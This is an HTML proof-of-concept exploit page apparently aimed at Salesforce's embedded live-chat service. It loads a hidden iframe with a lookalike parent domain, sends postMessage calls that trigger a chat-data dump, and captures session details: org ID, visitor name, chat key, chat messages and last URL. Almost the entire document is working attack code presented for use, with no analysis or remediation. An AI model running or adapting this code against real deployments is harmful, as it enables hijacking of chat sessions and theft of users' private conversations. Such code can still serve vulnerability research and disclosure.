<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Session Hijack PoC2</title>
  <meta charset="UTF-8">
</head>
<body>
  <h3>[+] Salesforce PoC: Extract Live Chat Session</h3>
  <iframe id="eswFrame"
          src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
          style="width:0;height:0;border:0;display:none"
          onload="onIframeReady()">
  </iframe>

  <script>
    const iframe = document.getElementById("eswFrame");

    function onIframeReady() {
      console.log("[+] Iframe loaded (Salesforce 4.0)");

      // Load required feature scripts
      iframe.contentWindow.postMessage({ method: "script.load", feature: "chasitor" }, "*");
      iframe.contentWindow.postMessage({ method: "script.load", feature: "filetransfer" }, "*");

      setTimeout(() => {
        console.log("[ðŸ“¤] Sending fake event to trigger session info leak");

        iframe.contentWindow.postMessage({
          method: "liveagent.event",
          data: {
            event: "chasitorDataDump",
            params: { key: "POC", value: "Session hijack attempt" }
          }
        }, "*");
      }, 2000); // Wait for scripts to load
    }

    window.addEventListener("message", (e) => {
      try {
        const msg = JSON.parse(typeof e.data === "string" ? e.data : JSON.stringify(e.data));
        if (msg.method === "liveagent.event") {
          console.log("ðŸ“© LiveAgent Response:", msg);
          const data = msg?.data?.chasitorData;
          if (data) {
            console.log("âœ… Session Extracted:", {
              orgId: data.orgId,
              name: data.name,
              chatKey: data.chatKey,
              messages: data.chatMessages,
              lastURL: data.lastUrl
            });
          }
        }
      } catch (e) {
        console.warn("Failed to parse message:", e);
      }
    });
  </script>
</body>
</html>
